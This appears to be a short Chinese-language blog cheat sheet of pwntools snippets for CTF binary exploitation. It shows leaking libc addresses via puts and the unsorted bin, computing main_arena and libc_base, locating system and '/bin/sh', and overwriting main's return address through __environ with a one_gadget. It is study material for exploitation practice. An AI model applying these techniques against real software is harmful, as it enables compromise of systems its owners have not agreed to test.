---
title: pwntools-code
date: 2018-03-31 21:23:18
categories:
tags:
	- tools
	- pwntools
---



**简单的记一下 pwntools 用到的命令 (不定期更新)**



`context.terminal = ['gnome-terminal', '-x', 'sh', '-c']`

`context.log_level = "debug"`

`p = process("./4-ReeHY-main")`

`libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')`

```python
gdb.attach(p,'''
b *0x080486bf
continue
''')
```

`libc_system = libc.symbols['system']`
`libc_binsh = next(libc.search("/bin/sh"))`

`puts_plt = elf.plt['puts']`

`p.recvuntil("$ ")`

`p.sendline("3")`

`p.interactive()`

`log.success('puts addr: ' + hex(puts_addr))`

```python
system_addr = u64(puts_addr+'\x00'*2)-puts_off+system_off
atoi_addr = u64(p.recv(8)) & 0xffffffffffff  
```


```Python
def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset
```

`    log.success('main arena addr: ' + hex(main_arena))`





**通过main_arena确定libc_base:**

首先要确定能够输出 chunk_A 内容，然后将chunk_A 链入 unsortedbin_addr (size>=0x80)。

unsortedbin_addr 中的 fb 就指向unsortedbin bins开头 ， 输出A内容，泄露unsortedbin_addr。

通过offset_bin_main_arena(0) 确定偏移。

```python
main_arena = unsortedbin_addr - offset_unsortedbin_main_arena
main_arena_offset = 0x3c4b20  
#通过gdb.attach(),vmmap 查看 第一个 .os 的其实地址 为 libc_base
# main_arena_offset = main_arena - libc_base
libc_base = main_arena - main_arena_offset
```

![img-2](pwntools-code/img-2.png)





**获取 main_arena 地址2**  , 确定libc_base

首先要确定能够输出 chunk_A 内容，然后将chunk_A 链入 unsortedbin_addr (size>=0x80)。

unsortedbin_addr 中的 fb 就指向unsortedbin bins开头 ， 输出A内容，泄露unsortedbin_addr。

main_arena = unsorted_offset_arena - unsorted_offset_arena(10*8+8)

![img-1](pwntools-code/img-1.png)

通过gdb.attach(),   vmmap 查看 第一个 .os 的其实地址 为 libc_base

main_arena_offset = main_arena - libc_base

**libc_base = main_arena - main_arena_offset**

![img-2](pwntools-code/img-2.png)

相关代码：

```python
main_arena_offset = 0x3c4b20
unsorted_offset_arena = 8 + 10 * 8
main_arena = unsorted_offset(泄露) - unsorted_offset_arena
#gdb.attach()
libc_base = main_arena - main_arena_offset
log.success('main arena addr: ' + hex(main_arena))
log.success('libc base addr: ' + hex(libc_base))
```





**修改程序的 main 函数的返回地址为 one_gadget**

需要知道需要泄露 libc_base 和 environ_pointer

```python
environ_pointer = libc_base + libc.symbols['__environ']
environ_addr = p.recvuntil('\n', drop=True).ljust(8, '\x00') 
#泄露environ_pointer 得到 environ_addr
environ_addr = u64(environ_addr)
main_ret_addr = environ_addr - 30 * 8
```

main_ret_addr 修改其内存地址为exc() 。